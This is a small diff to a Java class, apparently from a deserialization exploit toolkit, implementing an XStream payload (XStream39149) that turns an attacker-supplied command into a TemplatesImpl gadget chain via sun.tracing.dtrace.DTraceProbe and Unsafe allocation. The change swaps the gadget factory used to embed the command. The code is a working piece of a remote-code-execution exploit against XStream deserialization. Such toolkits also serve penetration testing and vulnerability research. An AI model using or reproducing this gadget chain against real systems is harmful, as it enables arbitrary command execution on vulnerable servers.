@@ -37,7 +37,7 @@ public class XStream39149 implements CommandObjectPayload<Object>
 
     @Override
     public Object getObject(String command) throws Exception {
-        final Object templates = Gadgets.createTemplatesImpl(command);
+        final Object templates = Gadgets.createTemplates4Cmd(command);
 
         Object dTraceProbe = instaniateUnsafe().allocateInstance(Class.forName("sun.tracing.dtrace.DTraceProbe"));
         Method method_getOutputProperties =  Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl").getDeclaredMethod("getOutputProperties");
